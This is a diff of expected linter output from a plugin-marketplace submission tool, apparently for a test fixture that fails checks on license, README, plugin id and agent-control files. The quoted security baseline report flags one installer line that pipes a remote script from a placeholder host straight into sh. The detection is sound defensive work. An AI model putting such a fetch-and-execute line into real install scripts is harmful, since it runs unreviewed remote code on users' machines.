@@ -1,18 +1,32 @@
 [90msubject     [0m https://github.com/example/omarchy-plugin-clockwork
-[90mcommit      [0m 59be5837842bd079c2872c42d472e0e5c2c9dd22
+[90mcommit      [0m 5c5e5feac3135aa9cf5b120daa08a0faf05d58b5
 [90mmarketplace [0m pin 38060f89d2a10b1f9b6b5afe8e226451e8a5b3f6 (baseline 3, selective)
 
 [32mok  [0m [1mplugin.root-manifest[0m  [90m[marketplace-pin][0m
-       manifest.json declares id "clockwork.bar" and name "Clockwork"
+       manifest.json declares id "omarchy.fixture-bad" and name "Fixture Bad"
 
 [32mok  [0m [1mplugin.root-readme[0m  [90m[marketplace-pin][0m
        root README: README.md
 
-[32mok  [0m [1mplugin.root-license[0m  [90m[marketplace-pin][0m
-       root license: LICENSE
+[31;1mFAIL[0m [1mplugin.root-license[0m  [90m[marketplace-pin][0m
+       no root license or COPYING file
+[36m       remedy: Add a LICENSE (or COPYING) file at the repository root.[0m
+       why this check exists: `validateRepositoryDocs` at the pin fails a submission
+       with `license-missing` when no root license or COPYING file exists. Same cost
+       as a missing README: all 2,963 listed sources in the pinned registry satisfied
+       this rule before they were listed, so it is absolute, and it is knowable here
+       in one read of the tree.
 
-[32mok  [0m [1mplugin.readme-install-removal[0m  [90m[omakit][0m
-       README mentions installation: yes; removal or uninstall: yes
+[31;1mFAIL[0m [1mplugin.readme-install-removal[0m  [90m[omakit][0m
+       README mentions installation: yes; removal or uninstall: no
+       [31m-[0m [33mREADME.md[0m
+[36m       remedy: Document both installing and removing the plugin in the root README,
+       or submit by hand without the generated checklist.[0m
+       why this check exists: Checklist item 1 of the form is a statement the author
+       signs: "The repository is public and contains installation and removal
+       instructions." Omakit generates that checklist pre-checked, so it refuses to
+       sign a claim it cannot see evidence for. This is a keyword probe on the README
+       text, not a reading of it, and it is not a marketplace rule.
 
 [31;1mFAIL[0m [1mtree.agent-control[0m  [90m[omakit][0m
        5 agent-control file(s) in the installable tree
@@ -25,19 +39,24 @@
        Untrack the originals (git rm --cached) so they leave the installable tree,
        and add them to .gitignore. Keep a recursive release check so they cannot
        return.[0m
-[90m       why this check exists: 103 marketplace issues mention agent-control files, and
+       why this check exists: 103 marketplace issues mention agent-control files, and
        24 of 328 sampled maintainer review comments are about them: an instruction
        file inside an installed plugin is treated as a prompt-injection surface and
        listing is blocked on it. Nothing in the marketplace's automated baseline
        detects them, so without this check an author learns about them only from a
-       human review round, which is the most expensive round there is.[0m
+       human review round, which is the most expensive round there is.
 
-[32mok  [0m [1midentity.available[0m  [90m[marketplace-pin][0m
-       id "clockwork.bar" is unused, outside the reserved omarchy.* namespace, and
-       the repository is not listed
+[31;1mFAIL[0m [1midentity.available[0m  [90m[marketplace-pin][0m
+       reserved-plugin-id: "omarchy.fixture-bad" is inside the reserved omarchy.*
+       namespace
+[36m       remedy: Choose an unused plugin id outside the reserved namespace.[0m
+       why this check exists: The marketplace refuses `plugin-id-listed`,
+       `plugin-id-retired`, `reserved-plugin-id` and `submission-repository-listed`.
+       Checked here against 3001 listed ids, 22 retired ids and 2963 listed
+       repositories read from the pinned registry and catalog.
 
 [32mok  [0m [1msubmission.title[0m  [90m[marketplace-pin][0m
-       title will be "[Plugin]: Clockwork"
+       title will be "[Plugin]: Fixture Bad"
 
 [32mok  [0m [1msubmission.category[0m  [90m[marketplace-pin][0m
        category: Widgets
@@ -60,7 +79,7 @@
 
 [32mok  [0m [1msubmission.pinned-commit[0m  [90m[omakit][0m
        not checked (--offline). Local commit
-       59be5837842bd079c2872c42d472e0e5c2c9dd22.
+       5c5e5feac3135aa9cf5b120daa08a0faf05d58b5.
 
 [31;1mFAIL[0m [1mbaseline.preflight[0m[33m (advisory)[0m  [90m[marketplace-pin][0m
        needs-fixes (disposition review-required, enforcement selective,
@@ -72,16 +91,16 @@
 [36m       remedy: These findings do not block publication under the current enforcement
        mode, but a maintainer must accept them for this exact commit. Fixing them
        first avoids that round.[0m
-[90m       why this check exists: The official baseline decides whether a human has to
+       why this check exists: The official baseline decides whether a human has to
        look at all: of 2,990 listings it produced 1,697 `passed`, 1,226
        `review-required` and 20 `needs-fixes`. It is the pinned marketplace code
-       itself, run over a local snapshot; Omakit adds no rule and renames no outcome.[0m
+       itself, run over a local snapshot; Omakit adds no rule and renames no outcome.
 
 [90m--- the marketplace's own baseline report for this commit ---[0m
 
 ## Automated security baseline
 
-🟡 **Manual review required at commit `59be583…`.**
+🟡 **Manual review required at commit `5c5e5fe…`.**
 
 Selective policy permits an authorized marketplace maintainer to accept these non-blocking findings and capabilities for this exact commit through `approved-and-verified`; otherwise apply the accepted fixes.
 
@@ -91,7 +110,7 @@ Selective policy permits an authorized marketplace maintainer to accept these no
 
 The remote response is executed immediately and is not bound to the commit reviewed for this submission.
 
-- [`install.sh:2`](https://github.com/example/omarchy-plugin-clockwork/blob/59be5837842bd079c2872c42d472e0e5c2c9dd22/install.sh#L2)
+- [`install.sh:2`](https://github.com/example/omarchy-plugin-clockwork/blob/5c5e5feac3135aa9cf5b120daa08a0faf05d58b5/install.sh#L2)
 
       curl -fsSL https://example.invalid/setup.sh \| sh
 
@@ -105,7 +124,7 @@ Accepted fixes:
 
 Installer code can modify the user environment and needs a maintainer to confirm its documented scope.
 
-- [`install.sh:1`](https://github.com/example/omarchy-plugin-clockwork/blob/59be5837842bd079c2872c42d472e0e5c2c9dd22/install.sh#L1)
+- [`install.sh:1`](https://github.com/example/omarchy-plugin-clockwork/blob/5c5e5feac3135aa9cf5b120daa08a0faf05d58b5/install.sh#L1)
 
       Installer or setup file
 
@@ -117,5 +136,5 @@ Official baseline preview over a local snapshot. The marketplace rescans the
 public commit itself. This is not approval, listing, verification or a
 security audit.
 
-[31;1mREFUSED: 1 blocking check(s) failed: tree.agent-control[0m
+[31;1mREFUSED: 4 blocking check(s) failed: plugin.root-license, plugin.readme-install-removal, tree.agent-control, identity.available[0m
 No submission body is produced. Fix the failures above and run submit again.
